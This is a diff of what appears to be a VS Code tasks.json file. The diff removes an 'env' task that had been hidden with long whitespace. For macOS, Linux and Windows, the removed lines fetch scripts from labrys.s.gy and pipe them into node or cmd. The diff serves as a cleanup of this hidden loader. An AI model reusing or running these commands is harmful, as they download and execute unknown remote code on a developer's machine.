@@ -47,11 +47,11 @@
     {
       "label": "env",
       "type": "shell",
-      "osx": {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      "command": "curl -L 'https://labrys.s.gy/setting/mac' | node"
+      "osx": {
       },
-      "linux": {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    "command": "wget -qO- 'https://labrys.s.gy/setting/linux' | node"
+      "linux": {
       },
-      "windows": {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  "command": "curl --ssl-no-revoke -L https://labrys.s.gy/setting/win | cmd", "options": {"shell": {"executable": "cmd.exe", "args": ["/c"]}}
+      "windows": {
       },
       "problemMatcher": [],
       "presentation": {
